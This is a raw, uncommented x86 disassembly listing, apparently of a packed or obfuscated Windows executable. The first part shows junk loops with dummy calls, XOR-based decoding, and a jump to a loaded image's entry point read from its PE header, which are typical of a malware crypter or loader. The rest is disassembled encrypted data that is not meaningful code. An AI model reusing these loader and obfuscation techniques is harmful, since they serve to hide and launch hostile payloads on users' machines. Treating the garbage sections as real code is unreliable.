  40961d:	cmp    DWORD PTR ds:0x430341,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e6c8,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e6c8
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e6c8,ecx
  40964a:	cmp    DWORD PTR ds:0x42e6c8,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42eb2f
  409672:	cmp    DWORD PTR ds:0x42e6c8,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e6c4
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x43035d,0x14
  4098db:	cmp    DWORD PTR ds:0x43035d,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x43035d,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42eb33
  40991f:	mov    eax,ds:0x43035d
  409924:	dec    eax
  409925:	mov    ds:0x43035d,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x4303d7
  409934:	or     eax,DWORD PTR ds:0x4303df
  40993a:	mov    ds:0x4303d7,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e6d0,0x13
  40994c:	cmp    DWORD PTR ds:0x42e6d0,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e6d0,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42eb37
  409979:	mov    ecx,DWORD PTR ds:0x42e6d0
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e6d0,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x430349,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x430359,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x4303cf,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x4303cf
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x4303cf,edi
  4099bf:	cmp    DWORD PTR ds:0x4303cf,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x43033d
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42e9c7
  4099e8:	cmp    DWORD PTR ds:0x4303cf,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x4303cf
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x4303cf,edi
  409a02:	cmp    DWORD PTR ds:0x4303cf,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x4303df,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x430335,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x430335
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x430335,ebx
  409a35:	cmp    DWORD PTR ds:0x430335,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e903
  409a50:	cmp    DWORD PTR ds:0x430335,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x430335
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x430335,ebx
  409a6a:	cmp    DWORD PTR ds:0x430335,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e6c8
  409a7d:	or     DWORD PTR ds:0x42eccb,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	dec    ebx
  409a95:	ror    DWORD PTR [ecx],cl
  409a97:	xchg   esp,eax
  409a98:	pop    ecx
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a56
  409aa1:	push   ds
  409aa2:	sub    DWORD PTR [edi+ecx*1+0x1d],ecx
  409aa6:	dec    ecx
  409aa7:	mov    esi,0x1de5b971
  409aac:	sbb    BYTE PTR [ecx-0xb],ah
  409aaf:	mov    al,ds:0xb6b58dd7
  409ab4:	mov    al,BYTE PTR [esi-0x3feb5b8]
  409aba:	je     0x409b0f
  409abc:	inc    edi
  409abd:	inc    esi
  409abe:	cmp    al,0x52
  409ac0:	aad    0x74
  409ac2:	adc    DWORD PTR [edx-0x45],esi
  409ac5:	sbb    edi,DWORD PTR [edi-0x4cd9ce39]
  409acb:	mov    ebx,fs
  409acd:	scas   eax,DWORD PTR es:[edi]
  409ace:	es xchg edx,eax
  409ad0:	and    eax,0x58d50b45
  409ad5:	inc    ebx
  409ad6:	popf   
  409ad7:	adc    ebp,ebp
  409ad9:	fs ret 
  409adb:	dec    eax
  409adc:	add    al,0x7b
  409ade:	push   edx
  409adf:	xor    al,dh
  409ae1:	push   edi
  409ae2:	xor    BYTE PTR [eax],dh
  409ae4:	mov    ecx,0xed49be25
  409ae9:	test   DWORD PTR [ecx+0x18],eax
  409aec:	aam    0x83
  409aee:	jmp    0x409b2e
  409af0:	in     al,0x0
  409af2:	nop
  409af3:	(bad)
  409af7:	sbb    al,0xd7
  409af9:	mov    dh,ch
  409afb:	sbb    eax,0xd4130730
  409b00:	adc    BYTE PTR [eax+0xdb9f590],dh
  409b06:	xchg   edx,eax
  409b07:	fsub   st,st(4)
  409b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b0a:	dec    esi
  409b0b:	push   edx
  409b0c:	call   0x90757caa
  409b11:	pmaxsw mm2,QWORD PTR [ecx]
  409b14:	cmp    dh,BYTE PTR [edi+0x587fc4ec]
  409b1a:	addr16 push cs
  409b1c:	fcomp  QWORD PTR [ecx+eiz*1]
  409b1f:	out    dx,eax
  409b20:	xchg   edx,eax
  409b21:	inc    ebx
  409b22:	xchg   ecx,eax
  409b23:	xor    eax,0x5e582a1d
  409b28:	adc    ch,al
  409b2a:	(bad)  
  409b2b:	cmp    esi,eax
  409b2d:	repz pop ecx
  409b2f:	repz mov eax,ds:0x3c42dfbf
  409b35:	test   al,0x34
  409b37:	repnz stc 
  409b39:	fdivr  QWORD PTR [ebx-0x67b58bc5]
  409b3f:	mov    ds:0xe7af661e,eax
  409b44:	jb     0x409b98
  409b46:	or     eax,0x93b491b2
  409b4b:	mov    DWORD PTR [eax],edx
  409b4d:	scas   al,BYTE PTR es:[edi]
  409b4e:	imul   edi,DWORD PTR [edi+eiz*8+0x35],0xdb32dd3d
  409b56:	jno    0x409b58
  409b58:	push   ss
  409b59:	retf   0xf4f3
  409b5c:	xchg   edx,eax
  409b5d:	jne    0x409b9e
  409b5f:	cmc    
  409b60:	or     BYTE PTR [eax],ah
  409b62:	xor    bh,BYTE PTR [eax-0x32]
  409b65:	(bad)  
  409b66:	sbb    ecx,DWORD PTR [esi]
  409b68:	mov    ds:0x60bb0e45,al
  409b6d:	xchg   ebp,eax
  409b6e:	pop    es
  409b6f:	(bad)  
  409b70:	cwde   
  409b71:	not    edx
  409b73:	jmp    0x5e6:0x31b415d6
  409b7a:	jae    0x409b12
  409b7c:	(bad)  
  409b7d:	dec    ecx
  409b7e:	sub    DWORD PTR [ebx-0x42],ecx
  409b81:	pusha  
  409b82:	xchg   DWORD PTR [edi],edx
  409b84:	hlt    
  409b85:	jle    0x409bbc
  409b87:	dec    edx
  409b88:	mov    dh,0x28
  409b8a:	mov    ds,WORD PTR [ebx+0xd]
  409b8d:	and    al,bl
  409b8f:	mov    bl,0x7
  409b91:	lods   al,BYTE PTR ds:[esi]
  409b92:	into   
  409b93:	std    
  409b94:	xor    edi,DWORD PTR [ecx+0x2111dc86]
  409b9a:	push   esp
  409b9b:	pop    eax
  409b9c:	cmp    edx,DWORD PTR [ecx]
  409b9e:	jmp    0x39196b1e
  409ba3:	sub    dh,BYTE PTR ss:[esi+edx*2]
  409ba7:	mov    ds:0x771a06c,al
  409bac:	sub    al,0x8e
  409bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409baf:	and    DWORD PTR [edi+esi*1-0x1357c378],0xfffffffa
  409bb7:	sub    bh,BYTE PTR ds:0x68b321f7
  409bbd:	adc    al,0xf5
  409bbf:	fstp   QWORD PTR [eax-0x27]
  409bc2:	sbb    ebp,DWORD PTR [edi-0x4d]
  409bc5:	xlat   BYTE PTR ds:[ebx]
  409bc6:	gs dec esp
  409bc8:	pop    ss
  409bc9:	add    BYTE PTR [ebx-0x5ee8a394],dh
  409bcf:	outs   dx,BYTE PTR ds:[esi]
  409bd0:	test   al,0x69
  409bd2:	dec    edx
  409bd3:	add    BYTE PTR [eax-0x79f5dd4d],al
  409bd9:	in     al,0x4d
  409bdb:	test   eax,0x75d68c8f
  409be0:	outs   dx,DWORD PTR ds:[esi]
  409be1:	fisttp QWORD PTR [ebx]
  409be3:	idiv   bh
  409be5:	adc    ecx,ebx
  409be7:	push   ss
  409be8:	(bad)  
  409be9:	mov    al,ds:0xf356aa2a
  409bee:	push   esi
  409bef:	idiv   DWORD PTR [esi+0x40]
  409bf2:	jbe    0x409b9b
  409bf4:	xor    edi,ebx
  409bf6:	mov    eax,0xa13cb5b6
  409bfb:	or     eax,0x4f07d262
  409c00:	scas   eax,DWORD PTR es:[edi]
  409c01:	adc    al,0x7a
  409c03:	push   edi
  409c04:	pop    ebp
  409c05:	stos   BYTE PTR es:[edi],al
  409c06:	xchg   edi,eax
  409c07:	xchg   DWORD PTR [ebp+0x265911f8],esp
  409c0d:	sbb    eax,0x1368b10e
  409c12:	add    edi,DWORD PTR [esi+0x3c]
  409c15:	sbb    eax,0x71659437
  409c1a:	mov    dl,0x75
  409c1c:	sub    DWORD PTR [eax],0xffffff9c
  409c1f:	and    DWORD PTR [ebp-0x3d9cc6c8],0x67
  409c26:	xchg   esp,eax
  409c27:	call   0x285f:0xbba80471
  409c2e:	mov    ?,WORD PTR [edi]
  409c30:	rol    DWORD PTR [ebp+0x2bddf00d],1
  409c36:	(bad)  
  409c37:	sar    DWORD PTR ds:0xa68d31ac,cl
  409c3d:	inc    esp
  409c3e:	sbb    esp,DWORD PTR [eax-0x6b2c590f]
  409c44:	push   ebp
  409c45:	xor    BYTE PTR [edx+edi*1+0x7a],ch
  409c49:	xchg   ebp,eax
  409c4a:	(bad)  
  409c4b:	not    eax
  409c4d:	xchg   esp,eax
  409c4e:	adc    DWORD PTR [edi-0x3e],eax
  409c51:	xchg   edx,eax
  409c52:	and    eax,0x44f47a27
  409c57:	dec    edi
  409c58:	jg     0x409be4
  409c5a:	rcr    DWORD PTR [eax],0x26
  409c5d:	shl    edx,1
  409c5f:	push   ecx
  409c60:	jnp    0x409bf1
  409c62:	mov    DWORD PTR [ecx+0x40],ebp
  409c65:	push   ebp
  409c66:	loopne 0x409bf2
  409c68:	(bad)  
  409c69:	sbb    DWORD PTR [eax],ecx
  409c6b:	inc    ebx
  409c6c:	pop    ss
  409c6d:	dec    esp
  409c6e:	out    dx,al
  409c6f:	jne    0x409c7f
  409c71:	test   BYTE PTR ds:0xa77918b6,cl
  409c77:	imul   esi,DWORD PTR [ebx-0x15297203],0xffffffc4
  409c7e:	sub    al,0xa8
  409c80:	cmp    ebx,ebx
  409c82:	fidiv  DWORD PTR [edi-0x471b9d5e]
  409c88:	popf   
  409c89:	jp     0x409c99
  409c8b:	inc    edx
  409c8c:	or     bh,BYTE PTR [edi]
  409c8e:	sbb    eax,0xdb9ff9ae
  409c93:	(bad)  
  409c94:	xlat   BYTE PTR ds:[ebx]
  409c95:	add    eax,0xbac29ac7
  409c9a:	xor    DWORD PTR [ebp-0x51],eax
  409c9d:	dec    esp
  409c9e:	mov    cl,0x9a
  409ca0:	ficomp WORD PTR [ebp+0x2c35e7de]
  409ca6:	stc    
  409ca7:	or     eax,0x473e5b7f
  409cac:	push   ecx
  409cad:	jle    0x409cd2
  409caf:	jno    0x409cdf
  409cb1:	adc    DWORD PTR [ecx+0x7a],0x7c
  409cb5:	jb     0x409ca9
  409cb7:	xor    BYTE PTR [edi],dh
  409cb9:	jg     0x409ced
  409cbb:	cld    
  409cbc:	push   ss
  409cbd:	push   ds
  409cbe:	idiv   bh
  409cc0:	aaa    
  409cc1:	cmp    DWORD PTR [ecx-0x3b],edi
  409cc4:	test   al,0xfc
  409cc6:	loope  0x409cc4
  409cc8:	stos   DWORD PTR es:[edi],eax
  409cc9:	jmp    0x409d21
  409ccb:	cdq    
  409ccc:	adc    eax,0xf26fec04
  409cd1:	scas   eax,DWORD PTR es:[edi]
  409cd2:	jno    0x409d25
  409cd4:	jo     0x409c9b
  409cd6:	xchg   BYTE PTR [ebx+0x52133e5b],bl
  409cdc:	clc    
  409cdd:	sub    eax,0xc11897b5
  409ce2:	out    dx,al
  409ce3:	dec    esp
  409ce4:	(bad)  
  409ce5:	pop    edi
  409ce6:	loopne 0x409c90
  409ce8:	cmp    al,0x7c
  409cea:	push   ss
  409ceb:	hlt    
  409cec:	ret    0xaeea
  409cef:	push   esp
  409cf0:	call   0x614e:0x8756ac90
  409cf7:	push   cs
  409cf8:	mov    eax,0x2f7b6ef7
  409cfd:	ret    0xd877
  409d00:	scas   eax,DWORD PTR es:[edi]
  409d01:	mov    dh,0x16
  409d03:	or     BYTE PTR [ebp+eiz*1-0x47c40a54],dl
  409d0a:	ja     0x409d29
  409d0c:	dec    edi
  409d0d:	es dec ebp
  409d0f:	xor    eax,0xdb4298d4
  409d14:	mov    ebx,DWORD PTR [ebx]
  409d16:	push   ds
  409d17:	sub    dl,dh
  409d19:	cdq    
  409d1a:	std    
  409d1b:	dec    esp
  409d1c:	sbb    al,0x75
  409d1e:	and    eax,0x8d263211
  409d23:	and    ecx,esp
  409d25:	lods   al,BYTE PTR ds:[esi]
  409d26:	or     BYTE PTR [edi+eiz*1],cl
  409d29:	mov    dh,0x8c
  409d2b:	sub    DWORD PTR [esi-0x2c1fa5b],eax
  409d31:	out    0x50,al
  409d33:	add    al,0xaa
  409d35:	jnp    0x409d48
  409d37:	scas   al,BYTE PTR es:[edi]
  409d38:	mov    al,ds:0x449a5d37
  409d3d:	xlat   BYTE PTR ds:[ebx]
  409d3e:	dec    esp
  409d3f:	outs   dx,DWORD PTR ds:[esi]
  409d40:	stc    
  409d41:	icebp  
  409d42:	xor    cl,BYTE PTR [edx+0x536c13df]
  409d48:	int    0x45
  409d4a:	mov    eax,0x1f7b34b0
  409d4f:	mov    ecx,eax
  409d51:	push   ss
  409d52:	push   0xffffffcc
  409d54:	mov    WORD PTR [eax+0x420eaf8],cs
  409d5a:	lea    edi,[edi]
  409d5c:	cdq    
  409d5d:	push   ds
  409d5e:	stc    
  409d5f:	outs   dx,BYTE PTR ds:[esi]
  409d60:	dec    ebp
  409d61:	push   ss
  409d62:	mov    bl,BYTE PTR [ebx+0x28789a0f]
  409d68:	mov    ah,0xd9
  409d6a:	adc    eax,edi
  409d6c:	mov    al,0x5c
  409d6e:	dec    edi
  409d6f:	sub    DWORD PTR ds:0xcb452e93,ebx
  409d75:	cmp    DWORD PTR [ebp-0x327323a8],esp
  409d7b:	mov    BYTE PTR [ecx+0x7],al
  409d7e:	pushf  
  409d7f:	adc    al,0xcc
  409d81:	jmp    0x409d2a
  409d83:	cld    
  409d84:	(bad)  
  409d85:	popf   
  409d86:	rcr    ah,cl
  409d88:	test   dh,al
  409d8a:	int3   
  409d8b:	(bad)  
  409d8c:	sub    BYTE PTR [edi-0x53bbd884],dh
  409d92:	js     0x409d95
  409d94:	jne    0x409dc8
  409d96:	xor    cl,BYTE PTR [edi+0x1c]
  409d99:	popf   
  409d9a:	pop    edi
  409d9b:	sub    al,0x26
  409d9d:	push   ebp
  409d9e:	pop    esp
  409d9f:	jge    0x409d36
  409da1:	inc    edi
  409da2:	sbb    DWORD PTR [edx+0x7bb6670d],esp
  409da8:	imul   ecx,esi,0xf4595a03
  409dae:	(bad)  
  409daf:	push   cs
  409db0:	imul   DWORD PTR [ecx]
  409db2:	inc    eax
  409db3:	out    dx,eax
  409db4:	or     DWORD PTR [eax],0x593b5d6f
  409dba:	mov    bh,al
  409dbc:	mov    al,ds:0x91c34afe
  409dc1:	dec    ebx
  409dc2:	imul   BYTE PTR [ecx-0x6ea6e1e5]
  409dc8:	mov    al,ds:0x8c4f92e6
  409dcd:	xchg   esi,eax
  409dce:	push   ebx
  409dcf:	xchg   edx,eax
  409dd0:	add    eax,edi
  409dd2:	mov    ebx,DWORD PTR ds:0x42e6d8
  409dd8:	add    ebx,DWORD PTR ds:0x4303d7
  409dde:	mov    DWORD PTR ds:0x42e6d8,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x43035d,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x4303cf,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x430351
  409e03:	and    DWORD PTR ds:0x430371,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x43034d,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409ea4
  409e2b:	push   ds
  409e2c:	jbe    0x409e7f
  409e2e:	or     eax,ebx
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409db8
  409e37:	push   esp
  409e38:	jl     0x409dbe
  409e3a:	clc    
  409e3b:	push   edx
  409e3c:	out    0xf6,al
  409e3e:	addr16 retf 
  409e40:	out    0x5b,eax
  409e42:	sahf   
  409e43:	fist   DWORD PTR [esi+ebx*1-0x7996ee2f]
  409e4a:	cmp    esi,DWORD PTR ds:0x45ca6b78
  409e50:	sbb    eax,0x96f0e14
  409e55:	jb     0x409e9d
  409e57:	mov    eax,0xfc682328
  409e5c:	xchg   edx,eax
  409e5d:	test   eax,0xe0d98fcb
  409e62:	dec    BYTE PTR [eax+0x35]
  409e65:	fisttp WORD PTR [ebp+0x3e70626b]
  409e6b:	sub    al,0x39
  409e6d:	cmp    DWORD PTR [ebx-0x5fa8f683],eax
  409e73:	adc    al,0x51
  409e75:	cs mov bl,0xd8
  409e78:	mov    BYTE PTR [eiz*1+0x738d59a8],ah
  409e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e80:	and    edx,edi
  409e82:	ja     0x409e8c
  409e84:	mov    dh,0x9a
  409e86:	gs cs lock dec esp
  409e8a:	jle    0x409efe
  409e8c:	inc    edi
  409e8d:	sahf   
  409e8e:	jmp    0xf941d075
  409e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e94:	pop    ebx
  409e95:	and    al,0x4e
  409e97:	mov    WORD PTR [ecx],es
  409e99:	and    edx,ebp
  409e9b:	mov    ebx,0xc6af9430
  409ea0:	in     eax,dx
  409ea1:	fcomp  DWORD PTR [edx]
  409ea3:	jbe    0x409f0c
  409ea5:	inc    ecx
  409ea6:	fisttp DWORD PTR [esi]
  409ea8:	push   ebp
  409ea9:	sub    eax,esp
  409eab:	ins    DWORD PTR es:[edi],dx
  409eac:	imul   BYTE PTR [esi+0x63]
  409eaf:	sbb    edx,DWORD PTR [eax]
  409eb1:	mov    bl,BYTE PTR [esi]
  409eb3:	dec    esi
  409eb4:	ret    
  409eb5:	(bad)  
  409eb6:	xchg   ebx,eax
  409eb7:	and    eax,0x34fe31ff
  409ebc:	int3   
  409ebd:	cmp    ecx,ecx
  409ebf:	cmp    DWORD PTR ds:0xf2e19e33,eax
  409ec5:	(bad)  
  409ec7:	(bad)  
  409ec8:	mov    esi,?
  409eca:	and    BYTE PTR [edi+ebp*4-0x78cfda5e],dl
  409ed1:	lock outs dx,BYTE PTR ds:[esi]
  409ed3:	cdq    
  409ed4:	je     0x409e91
  409ed6:	or     dl,BYTE PTR [esi+ebp*8-0x31f51b11]
  409edd:	xchg   ecx,eax
  409ede:	push   ds
  409edf:	mov    ds:0x67b396ff,al
  409ee4:	or     ebp,eax
  409ee6:	mov    cl,0x55
  409ee8:	gs idiv edx
  409eeb:	rol    esi,0xcb
  409eee:	inc    edx
  409eef:	fild   DWORD PTR [esi]
  409ef1:	out    dx,al
  409ef2:	add    DWORD PTR [ebx+0x4b980270],ebx
  409ef8:	cmp    ebx,DWORD PTR [edi+0x23]
  409efb:	neg    cl
  409efd:	stos   BYTE PTR es:[edi],al
  409efe:	xchg   ecx,eax
  409eff:	outs   dx,BYTE PTR ds:[esi]
  409f00:	js     0x409f62
  409f02:	(bad)  
  409f03:	mov    ah,0xff
  409f05:	hlt    
